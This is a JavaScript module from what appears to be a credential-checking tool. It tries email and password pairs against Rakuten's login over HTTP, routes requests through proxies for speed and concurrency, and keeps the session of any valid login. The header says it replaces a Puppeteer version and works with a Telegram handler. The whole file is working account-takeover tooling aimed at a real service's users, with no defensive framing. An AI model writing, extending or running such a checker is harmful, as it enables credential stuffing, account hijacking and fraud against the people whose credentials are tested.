/**
 * =============================================================================
 * HTTP CHECKER - HTTP-BASED RAKUTEN CREDENTIAL CHECKER
 * =============================================================================
 * 
 * HTTP-based equivalent of puppeteerChecker.js.
 * Provides same interface for drop-in compatibility with telegramHandler.js.
 * 
 * Uses pure HTTP requests instead of Puppeteer for faster, more concurrent checks.
 * 
 * =============================================================================
 */

const { createSession, touchSession, closeSession } = require('./automation/http/sessionManager');
const { navigateToLogin, submitEmailStep, submitPasswordStep } = require('./automation/http/httpFlow');
const { detectOutcome } = require('./automation/http/htmlAnalyzer');
const { captureAccountData } = require('./automation/http/httpDataCapture');
const { createLogger } = require('./logger');

const log = createLogger('http-checker');

/**
 * Checks Rakuten credentials using HTTP requests.
 * Drop-in replacement for puppeteerChecker.checkCredentials()
 * 
 * @param {string} email - Email/username
 * @param {string} password - Password
 * @param {Object} [options] - Check options
 * @param {string} [options.targetUrl] - Target login URL
 * @param {number} [options.timeoutMs=60000] - Timeout in milliseconds
 * @param {string} [options.proxy] - Proxy URL
 * @param {boolean} [options.screenshotOn=false] - Screenshot (not applicable for HTTP)
 * @param {boolean} [options.headless] - Headless mode (not applicable for HTTP)
 * @param {Function} [options.onProgress] - Progress callback
 * @param {boolean} [options.deferCloseOnValid=false] - Keep session open if valid
 * @returns {Promise<Object>} Result object with status, message, session
 */
async function checkCredentials(email, password, options = {}) {
  const {
    targetUrl = process.env.TARGET_LOGIN_URL,
    timeoutMs = 60000,
    proxy = null,
    screenshotOn = false,
    headless = true,
    onProgress = null,
    deferCloseOnValid = false,
  } = options;

  if (!targetUrl) {
    throw new Error('Target login URL is required');
  }

  let session = null;
  let preserveSession = false;

  try {
    log.info('Starting HTTP-based credential check...');
    onProgress && (await onProgress('launch'));
    
    // Create HTTP session
    session = createSession({
      proxy,
      timeout: timeoutMs,
    });

    log.info('Navigating to Rakuten login page...');
    onProgress && (await onProgress('navigate'));
    const navigationResult = await navigateToLogin(session, targetUrl, timeoutMs);

    log.info('Submitting email/username step...');
    onProgress && (await onProgress('email'));
    const emailResult = await submitEmailStep(
      session,
      email,
      navigationResult,
      timeoutMs
    );

    log.info('Submitting password step...');
    onProgress && (await onProgress('password'));
    const passwordResult = await submitPasswordStep(
      session,
      password,
      emailResult,
      email,
      timeoutMs
    );

    log.info('Analyzing login result...');
    onProgress && (await onProgress('analyze'));
    const outcome = detectOutcome(passwordResult, passwordResult.finalUrl);

    // Note: Screenshots not applicable for HTTP checker
    if (screenshotOn) {
      log.debug('Screenshot option ignored (not applicable for HTTP checker)');
    }

    preserveSession = deferCloseOnValid && outcome.status === 'VALID';
    
    return {
      ...outcome,
      session: preserveSession ? session : undefined,
    };
  } catch (error) {
    log.error('Error during credential check:', error.message);

    return {
      status: 'ERROR',
      message: `HTTP automation error: ${error.message}`,
      screenshot: null,
    };
  } finally {
    if (!preserveSession && session) {
      closeSession(session);
    }
  }
}

module.exports = { checkCredentials };
